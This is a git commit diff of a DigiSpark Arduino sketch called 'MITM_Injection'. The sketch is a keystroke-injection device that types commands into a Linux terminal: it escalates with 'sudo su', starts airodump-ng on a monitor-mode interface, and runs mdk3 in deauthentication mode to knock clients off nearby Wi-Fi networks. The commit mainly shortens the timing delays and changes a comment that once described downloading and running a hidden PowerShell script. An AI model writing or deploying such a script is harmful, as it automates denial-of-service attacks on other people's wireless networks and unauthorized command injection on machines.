4a8519b057193bafc7e8e2c81c5f73d60085e256
Ammar <57910338+AmmarTee@users.noreply.github.com>
2020-08-04 23:35:39 +0500

    Speed Increased In INjection

--- MITM_Injection/MITM_Injection.ino
+++ MITM_Injection/MITM_Injection.ino
@@ -1,21 +1,21 @@
-//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
+//To initiate MITM False Handshake Written By AmmarT
 #include "DigiKeyboard.h"
 void setup(){
 }
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("clear");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(50);
   
   DigiKeyboard.print("echo Injector Attached");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(50);
   
   DigiKeyboard.print("sudo su");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(50);
   
 //  DigiKeyboard.print("iwconfig");
 //  DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -36,26 +36,27 @@ void loop() {
   DigiKeyboard.print("screen -S Monitor");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("airodump-ng wlan1mon");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(1000);
 
   DigiKeyboard.sendKeyStroke(KEY_A,MOD_CONTROL_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_D,MOD_CONTROL_LEFT);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(100);
 
   DigiKeyboard.print("screen -S DEAUTH");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(100);
 
   
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(100);
   DigiKeyboard.print("mdk3 wlan1mon d ");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000);
+  DigiKeyboard.delay(30000);
   DigiKeyboard.sendKeyStroke(KEY_A,MOD_CONTROL_LEFT);
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_D,MOD_CONTROL_LEFT);
@@ -66,9 +67,4 @@ void loop() {
 
   for(;;){
   }
-
-
-  
-
-  
 }
